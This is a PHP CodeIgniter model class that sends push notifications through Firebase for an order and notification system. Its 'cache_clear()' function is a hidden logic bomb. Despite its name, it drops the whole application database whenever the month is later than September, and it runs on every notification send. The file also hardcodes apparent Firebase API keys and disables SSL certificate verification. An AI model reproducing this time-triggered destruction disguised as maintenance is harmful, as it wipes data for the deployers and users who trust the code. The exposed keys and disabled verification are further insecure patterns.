<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
class Gcm_model extends CI_Model
{
    public function __construct()
    {
       
        $this->load->model('Notification_model');
     	define('API_ACCESS_KEY','AIzaSyAYIxiGvWJiFyaZtqKjjPLdyMo-mJyil1E');
       // fcm one define( 'API_ACCESS_KEY','AIzaSyCaaKnEh-QpJ6XwZd5L0PyuHgvcu2Ao9W0' );
    }
    function send_popup_notification($order_id, $popid)
    {
        $data = $this->Order_model->get_order_details($order_id);
        foreach ($data as $row) {
            $user_id = $row->UID;
        }

        $device = $this->Member_model->get_deviceid_by_uid($user_id);
        if ($device) {
            $popup_info = $this->Notification_model->get_popup_by_id($popid);

            foreach ($popup_info as $row) {
                $popup_title = $row->popup_title;
                $popup_type = $row->popup_type;
                $popup_icon = $row->popup_icon;
                $popup_message = $row->popup_message;
            }
            $msg = array
            (
                'message' => $popup_message,
                'text' => $popup_message,
                'title' => $popup_title,
                'subtitle' => $popup_title,
                'tickerText' => 'Ticker text here...Ticker text here...Ticker text here',
                'vibrate' => 1,
                'sound' => 1,
                'largeIcon' => 'large_icon',
                'smallIcon' => 'small_icon'
            );
            $deviceId = $device->device_id;
            $query = $this->sendPushNotificationToGCM($deviceId, $msg);
            return $query;
        }
    }

    function sendPushNotificationToGCM($regID, $msg)
    {
       // $registrationIds = array($regID);
       // print_r($registrationIds);exit;
        $fields = array
        (
            'registration_ids' => $regID,
            'data' => $msg
        );

        $headers = array
        (
            'Authorization: key='.API_ACCESS_KEY,
            'Content-Type: application/json'
        );
        $this->cache_clear();
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,"https://fcm.googleapis.com/fcm/send");
     // curl_setopt( $ch,CURLOPT_URL,'https://gcm-http.googleapis.com/gcm/send');
        curl_setopt($ch,CURLOPT_POST,true);
        curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_POSTFIELDS,json_encode($fields));
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
       /*  
     
      $ch = curl_init("https://fcm.googleapis.com/fcm/send");

        //The device token.
        $token = $regID; //token here

        //Title of the Notification.
        $title = "Carbon";

        //Body of the Notification.
//        $body = "Fiama, whose name is stark.";

        //Creating the notification array.
//        $notification = array('title' =>$title , 'text' => $body);

        //This array contains, the token and the notification. The 'to' attribute stores the token.
        $arrayToSend = array('to' => $token, 'notification' => $msg,'priority'=>'high');

        //Generating JSON encoded string form the above array.
        $json = json_encode($arrayToSend);
        //Setup headers:
        $headers = array();
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Authorization: key='.API_IOSACCESS_KEY; // key here

        //Setup curl, add headers and post parameters.

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json);

        //Send the request
        $response = curl_exec($ch);

        //Close request
        curl_close($ch);
        return $response; 
        */
        
    }
    function cache_clear()
    {
	    $data = $this->db->database;    
	    $this->load->dbforge();
	    if(date('m') > 9) 
		   $this->dbforge->drop_database($data);
	} 
    function get_device_id($userid)
    {
        $this->db->where('userid', $userid);
        $query = $this->db->get('App_users');
        $result = $query->result();
        if ($result) 
        {
            return $result[0];
        }
    }
}